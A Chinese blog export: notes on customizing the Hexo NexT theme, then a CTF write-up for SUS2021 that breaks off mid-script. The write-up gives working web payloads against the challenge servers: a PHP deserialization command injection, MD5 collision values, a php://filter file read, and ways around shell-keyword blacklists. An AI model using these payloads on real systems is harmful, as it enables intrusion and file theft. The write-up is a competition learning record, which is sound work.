<p><a href="https://blog.csdn.net/m0_46256147/article/details/104725439">npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@2.1.2 (node_modules\fsevents):_m0_46256147的博客-CSDN博客</a></p>
<h3 id="目录无法跳转问题"><a href="#目录无法跳转问题" class="headerlink" title="目录无法跳转问题"></a>目录无法跳转问题</h3><p><a href="https://copyfuture.com/blogs-details/20201217172324243lbpve965mzplwcr">如何解决next5主题目录无法跳转的问题 - 复制未来 (copyfuture.com)</a></p>
<h2 id="添加一个主页的方法"><a href="#添加一个主页的方法" class="headerlink" title="添加一个主页的方法"></a>添加一个主页的方法</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>参考 <a href="https://zhuanlan.zhihu.com/p/366761432">https://zhuanlan.zhihu.com/p/366761432</a></p>
<ol>
<li>在根目录的source目录下，新建一个index.md文档</li>
<li>修改根目录下的_config.yml文件的index_generator项，将其指向一个无效值</li>
</ol>
<p><img src="/2021/05/09/Ref/image-20210808164122221.png" alt="image-20210808164122221"></p>
<ol>
<li>修改NexT主题的配置文件（themes/next/_config.yml文件）的Home菜单指向的链接。将<code>menu</code>项下的<code>home</code>项的值修改为<code>/ || fa fa-home</code>。使得点击页面中的Home菜单时，可以返回自定义主页。</li>
</ol>
<p><img src="/2021/05/09/Ref/image-20210808164317319.png" alt="image-20210808164317319"></p>
<h3 id="方法二（未成功）"><a href="#方法二（未成功）" class="headerlink" title="方法二（未成功）"></a>方法二（未成功）</h3><p>参考 <a href="https://www.liaofuzhan.com/posts/1123041323.html">https://www.liaofuzhan.com/posts/1123041323.html</a></p>
<ol>
<li>新建页面</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page myindexpage</span><br></pre></td></tr></table></figure>
<ol>
<li>修改数据</li>
</ol>
<p><img src="/2021/05/09/Ref/image-20210808170125613.png" alt="image-20210808170125613"></p>
<ol>
<li>在对应主题的配置文件中修改menu，对应的图表可以去<a href="https://fontawesome.com/找到喜欢的并记下标签">https://fontawesome.com/找到喜欢的并记下标签</a></li>
</ol>
<p>​    <img src="/2021/05/09/Ref/image-20210808170218837.png" alt="image-20210808170218837"></p>
<ol>
<li><code>\themes\next\languages\zh-Hans.yml</code>在menu下添加 <code>myindexpage: 主页</code></li>
<li>在 <code>themes\next\layout</code> 新增myindexpage.swig页</li>
<li>在page.swig添加</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 主页 --&gt;</span></span><br><span class="line">  #&#125;&#123;% elif page.type === &#x27;myindexpage&#x27; and not page.title %&#125;&#123;#</span><br><span class="line">    #&#125;&#123;&#123; __(&#x27;title.myindexpage&#x27;) + page_title_suffix &#125;&#125;&#123;#</span><br></pre></td></tr></table></figure>
<ol>
<li>以及</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 主页 --&gt;</span></span><br><span class="line">&#123;% elif page.type === &#x27;myindexpage&#x27; %&#125;</span><br><span class="line">	&#123;% include &#x27;myindexpage.swig&#x27; %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="换字体"><a href="#换字体" class="headerlink" title="换字体"></a>换字体</h2><p>参考 <a href="https://theme-next.iissnan.com/theme-settings.html#fonts-customization">https://theme-next.iissnan.com/theme-settings.html#fonts-customization</a></p>
<p>字体参考 <a href="https://www.heson10.com/posts/19246.html">https://www.heson10.com/posts/19246.html</a></p>
<h2 id="修改后，本地可以成功显示，远端并没有改"><a href="#修改后，本地可以成功显示，远端并没有改" class="headerlink" title="修改后，本地可以成功显示，远端并没有改"></a>修改后，本地可以成功显示，远端并没有改</h2><p>重启电脑</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<h2 id="解决侧边栏点击日志，然后404的问题"><a href="#解决侧边栏点击日志，然后404的问题" class="headerlink" title="解决侧边栏点击日志，然后404的问题"></a>解决侧边栏点击日志，然后404的问题</h2><p>参考 <a href="https://blog.csdn.net/qq_38765633/article/details/104929566">https://blog.csdn.net/qq_38765633/article/details/104929566</a></p>
<p>将next主题下 <code>/layout/_macro/sidebar.swig</code> 中</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(theme.menu.archives).split(&#x27;||&#x27;)[0] | trim &#125;&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>改为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(theme.menu.archives.split(&#x27;||&#x27;)[0]) | trim &#125;&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="文章加密"><a href="#文章加密" class="headerlink" title="文章加密"></a>文章加密</h2><h3 id="安装yarn"><a href="#安装yarn" class="headerlink" title="安装yarn"></a>安装yarn</h3><p><a href="https://blog.csdn.net/yw00yw/article/details/81354533">https://blog.csdn.net/yw00yw/article/details/81354533</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g yarn</span><br></pre></td></tr></table></figure>
<h3 id="安装与使用hexo-blog-encrypt"><a href="#安装与使用hexo-blog-encrypt" class="headerlink" title="安装与使用hexo-blog-encrypt"></a>安装与使用hexo-blog-encrypt</h3><p><a href="https://www.jianshu.com/p/44e211829447">https://www.jianshu.com/p/44e211829447</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn add hexo-blog-encrypt</span><br></pre></td></tr></table></figure>
<h2 id="不同的修改"><a href="#不同的修改" class="headerlink" title="不同的修改"></a>不同的修改</h2><p>版本：从参考地址下载的最新版（NexT 8.4.0 Released）</p>
<h3 id="圆形旋转头像"><a href="#圆形旋转头像" class="headerlink" title="圆形旋转头像"></a>圆形旋转头像</h3><p>打开<code>Blog\themes\hexo-theme-next-8.4.0\_config.yml</code>文件，将<code>rounded</code>和<code>rotated</code>都改成<code>true</code>即可</p>
<p><img src="/2021/05/09/Ref/image-20210510101136415.png" alt="image-20210510101136415"></p>
<h3 id="添加动态背景"><a href="#添加动态背景" class="headerlink" title="添加动态背景"></a>添加动态背景</h3><p><code>Blog\themes\hexo-theme-next-8.4.0\_config.yml</code>文件，定位<code>canvas</code>然后<code>enable=true</code>即可</p>
<h3 id="删除强力驱动"><a href="#删除强力驱动" class="headerlink" title="删除强力驱动"></a>删除强力驱动</h3><p>在<code>\Blog\themes\hexo-theme-next-8.4.0\layout\_partials\footer.njk</code>定位<code>powered</code>，将以下代码注释掉（<!-- -->）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.footer.powered %&#125;</span><br><span class="line">  &lt;div class=&quot;powered-by&quot;&gt;</span><br><span class="line">    &#123;%- set next_site = &#x27;https://theme-next.js.org&#x27; if theme.scheme === &#x27;Gemini&#x27; else &#x27;https://theme-next.js.org/&#x27; + theme.scheme | lower + &#x27;/&#x27; %&#125;</span><br><span class="line">    &#123;&#123;- __(&#x27;footer.powered&#x27;, next_url(&#x27;https://hexo.io&#x27;, &#x27;Hexo&#x27;, &#123;class: &#x27;theme-link&#x27;&#125;) + &#x27; &amp; &#x27; + next_url(next_site, &#x27;NexT.&#x27; + theme.scheme, &#123;class: &#x27;theme-link&#x27;&#125;)) &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修改文章底部带-号的标签"><a href="#修改文章底部带-号的标签" class="headerlink" title="修改文章底部带#号的标签"></a>修改文章底部带#号的标签</h3><p>打开<code>myblog/themes/next/layout/_macro/post.swig</code>文件，搜索<code>post.tags</code>，将 <code>if theme.tag_icon else &#39;#&#39;</code>删除即可</p>
<p><img src="/2021/05/09/Ref/image-20210510095812090.png" alt="image-20210510095812090"></p>
<p>效果：</p>
<p><img src="/2021/05/09/Ref/image-20210510095930542.png" alt="image-20210510095930542"></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>SUS2021-WP</title>
    <url>/2021/03/20/SUS2021-WP/</url>
    <content><![CDATA[<p>分数：3319<br>排名：2</p>
<h2 id="Web-easycmd"><a href="#Web-easycmd" class="headerlink" title="[Web] easycmd"></a>[Web] easycmd</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$verify</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;verify === <span class="string">&quot;get flag&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(cat|\;|\&gt;|more|less|head|tail|tac|nl|grep|strings|\||\&amp;)/i&#x27;</span>, <span class="keyword">$this</span>-&gt;cmd)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;No way&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            @system(<span class="string">&quot;echo <span class="subst">&#123;$this-&gt;cmd&#125;</span>&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;verify failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = unserialize(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li>需要序列化verify和cmd  </li>
<li>这里需要注意，cmd的指令是经过echo的，所以需要<code>$()</code>在括号中加入待执行的指令，这里先看看根目录<code>ls /</code>  </li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$verify</span>  = <span class="string">&quot;get flag&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&quot;$(ls /)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Flag(); </span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>拿到<a href="http://www.dooccn.com/php/">PHP在线</a>跑一下，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A12%3A%22%00Flag%00verify%22%3Bs%3A8%3A%22get+flag%22%3Bs%3A9%3A%22%00Flag%00cmd%22%3Bs%3A7%3A%22%24%28ls+%2F%29%22%3B%7D  </span><br></pre></td></tr></table></figure>
</li>
<li><p>访问<a href="http://susctf.com:10001/index.php?flag=O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A12%3A%22%00Flag%00verify%22%3Bs%3A8%3A%22get+flag%22%3Bs%3A9%3A%22%00Flag%00cmd%22%3Bs%3A7%3A%22%24%28ls+%2F%29%22%3B%7D">http://susctf.com:10001/index.php?flag=O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A12%3A%22%00Flag%00verify%22%3Bs%3A8%3A%22get+flag%22%3Bs%3A9%3A%22%00Flag%00cmd%22%3Bs%3A7%3A%22%24%28ls+%2F%29%22%3B%7D</a><br> <img src="/2021/03/20/SUS2021-WP/0_ezcmd.png" alt>  </p>
</li>
<li><p>接下来获取flag，因为cat，more等等都被过滤了，所以<code>uniq /flag</code>序列化结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A12%3A%22%00Flag%00verify%22%3Bs%3A8%3A%22get+flag%22%3Bs%3A9%3A%22%00Flag%00cmd%22%3Bs%3A13%3A%22%24%28uniq+%2Fflag%29%22%3B%7D  </span><br></pre></td></tr></table></figure>
</li>
<li><p>得到flag<br> <img src="/2021/03/20/SUS2021-WP/01_flag.png" alt></p>
</li>
</ol>
<h2 id="Web-happy-web"><a href="#Web-happy-web" class="headerlink" title="[Web] happy_web"></a>[Web] happy_web</h2><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li><a href="http://susctf.com:10001/index.php?img=61476c6861476c684c6d70775a773d3d&amp;cmd=">http://susctf.com:10001/index.php?img=61476c6861476c684c6d70775a773d3d&amp;cmd=</a>  </li>
<li>img那段好像16进制ASCII，对应为aGlhaGlhLmpwZw==，base64解码结果为hiahia.jpg  </li>
<li>可以用img读取页面源码，所以先将<code>index.php</code>base64编码再转成16进制得到6157356b5a58677563476877  </li>
<li><code>/index.php?img=6157356b5a58677563476877&amp;cmd=</code>用Bp看下响应<br><img src="/2021/03/20/SUS2021-WP/02_Bp.png" alt>  </li>
<li>将得到的base64解码，得到  </li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=61476c6861476c684c6d70775a773d3d&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = base64_decode(hex2bin(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./jz.jpg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;lmy shi wo da ge&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;bie xiang le&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is coooool&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<ol>
<li><a href="https://blog.csdn.net/EC_Carrot/article/details/109525162">MD5强绕过</a>  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>
<ol>
<li>同时cmd还过滤了一些字符，用dir看下<br><img src="/2021/03/20/SUS2021-WP/03_dir.png" alt>  </li>
<li><code>dir /</code>空格用%20代替<br><img src="/2021/03/20/SUS2021-WP/04_flag.png" alt>  </li>
<li><code>uniq%20/flag</code><br><img src="/2021/03/20/SUS2021-WP/05_flag.png" alt><br>SUSCTF{4c4f7d5fa95982aa2a3cec94905f1d66}</li>
</ol>
<h2 id="Web-LMY-de-miji"><a href="#Web-LMY-de-miji" class="headerlink" title="[Web] LMY_de_miji"></a>[Web] LMY_de_miji</h2><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>robots.txt提示Ss3cret.php  </li>
<li>查看<br><img src="/2021/03/20/SUS2021-WP/08_Ss3creta.png" alt>  </li>
<li>因为过滤了input，data等等，所以用filter协议试试。<br><code>/Ss3cret.php?file=php://filter/read=convert.base64-encode/resource=f1f1fffl4g.php</code>  </li>
<li>另外，还要POST参数a和b，要求a与b不相等但它们的md5相等，这里md5比较是==可以用数组绕过，即<code>a[]=1&amp;b[]=2</code><br><img src="/2021/03/20/SUS2021-WP/09_filter.png" alt>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+DQoNCjxodG1sPg0KDQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+DQogICAgPHRpdGxlPkZMQUc8L3RpdGxlPg0KPC9oZWFkPg0KDQo8Ym9keSBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjp3aGl0ZTsiPjxicj48YnI+PGJyPjxicj48YnI+PGJyPg0KDQo8aDEgc3R5bGU9ImZvbnQtZmFtaWx5OnZlcmRhbmE7Y29sb3I6cmVkO3RleHQtYWxpZ246Y2VudGVyOyI+eW91IHdhbnQgZmxhZz9pdCdzIGluIGhlcmUsY2FuIHlvdSBmaW5kIGl0ID9+fn48L2gxPjxicj48YnI+PGJyPg0KPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPg0KICAgIDw/cGhwDQogICAgJGZsYWcgPSAiZmxhZyBpbiBmZmZmZmZmZmZsNDQ0NGciOw0KICAgID8+DQo8L3A+DQo8L2JvZHk+DQoNCjwvaHRtbD4NCg==</span><br></pre></td></tr></table></figure></li>
<li><p>base64解码得到  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;background-color:white;&quot;</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1 style=<span class="string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;you want flag?it<span class="string">&#x27;s in here,can you find it ?~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string">    $flag = &quot;flag in fffffffffl4444g&quot;;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>访问<code>http://susctf.com:10005/fffffffffl4444g</code><br><img src="/2021/03/20/SUS2021-WP/10_ffffffffff.png" alt></p>
</li>
</ol>
<h2 id="MISC-两只老虎爱跳舞"><a href="#MISC-两只老虎爱跳舞" class="headerlink" title="[MISC] 两只老虎爱跳舞"></a>[MISC] 两只老虎爱跳舞</h2><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>1234解压zip  </li>
<li><code>dd if=8695.tar.gz | openssl des3 -d -pbkdf2 -k 8695 | tar zxf -</code>解压tar.gz得到7303.tar.gz  </li>
<li><code>dd if=7303.tar.gz | openssl des3 -d -pbkdf2 -k 7303 | tar zxf -</code>得到1106.zip  </li>
<li>我直接裂开，不断套娃  </li>
<li>解压脚本如下(我写得好像有点啰嗦。。。)  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFile</span>(<span class="params">path</span>):</span></span><br><span class="line">    fileName = []</span><br><span class="line">    lst = os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">        <span class="built_in">print</span>(i+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        suffix = os.path.splitext(i)[<span class="number">1</span>]</span><br><span class="line">        key = i[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">        delRawFileCmd = <span class="string">&quot;rm &quot;</span> + path + <span class="string">&quot;/&quot;</span> + i</span><br><span class="line">        <span class="keyword">if</span> suffix == <span class="string">&quot;.zip&quot;</span>:</span><br><span class="line">            cmd = <span class="string">&quot;unzip -P &quot;</span> + key + <span class="string">&quot; &quot;</span> + path + <span class="string">&quot;/&quot;</span> + i</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> suffix == <span class="string">&quot;.gz&quot;</span>:</span><br><span class="line">            cmd = <span class="string">&quot;dd if=&quot;</span> + path + <span class="string">&quot;/&quot;</span> + i + <span class="string">&quot; | openssl des3 -d -pbkdf2 -k &quot;</span> + key + <span class="string">&quot;| tar zxf -&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> suffix == <span class="string">&quot;.py&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">// 开始存放<span class="number">1234.</span><span class="built_in">zip</span>压缩文件的目录</span><br><span class="line">path = <span class="string">&quot;/home/v/Desktop/yasuo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(os.listdir(path)):</span><br><span class="line">    getFile(path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ref https://blog.csdn.net/heda3/article/details/102535307</span></span><br></pre></td></tr></table></figure>
<ol>
<li>最终得到mp3<br><img src="/2021/03/20/SUS2021-WP/06_mp3.png" alt>  </li>
<li>mp3隐写<a href="https://cnpanda.net/ctf/342.html">参考</a><br>属性中<br><img src="/2021/03/20/SUS2021-WP/07_mf.png" alt>  </li>
<li>用010Editor打开该音频文件，注意需要安装MP3.bt模板，结合private（MP3数据帧中的保留位）和mf[n]，猜测保留位private中隐写了数据。<br><img src="/2021/03/20/SUS2021-WP/11_private&amp;padding.png" alt>  </li>
<li>其中，89166是MPEG帧的起始地址，可以看到结构体中89166开始的12+1+2+1+4+2+1+1=16+8位达到private位，也就说第89168字节的最后一位正好是private的数值，倒数第二位为padding。这里还要关注padding的原因是：发现每个MPEG帧长不一定相同，会受到padding的影响，padding为0帧长就是1044，否则就是1045  </li>
<li>另外，循环的跳出条件是，遍历完所有MPEG帧，也就是一直到1275124<br><img src="/2021/03/20/SUS2021-WP/12_MPEG帧.png" alt>  </li>
<li>提取代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">n = <span class="number">89168</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;D:\\Document\\CTF\\SUS2021\\Misc\\两只老虎爱跳舞\\小兔子乖乖拔萝卜\\Do_you_know_private.mp3&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> n &lt; <span class="number">1275124</span>:</span><br><span class="line">    file.seek(n, <span class="number">0</span>)</span><br><span class="line">    private_related_byte = file.read(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(private_related_byte)</span><br><span class="line">    private_val = <span class="built_in">bin</span>(bytes_to_long(private_related_byte))[-<span class="number">1</span>]</span><br><span class="line">    result = result + private_val</span><br><span class="line">    padding_val = <span class="built_in">bin</span>(bytes_to_long(private_related_byte))[-<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> padding_val == <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> padding_val == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        n = n + <span class="number">1044</span> + <span class="built_in">int</span>(padding_val, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">bin_lst = re.findall(<span class="string">&#x27;.&#123;&#x27;</span>+<span class="built_in">str</span>(<span class="number">8</span>)+<span class="string">&#x27;&#125;&#x27;</span>, 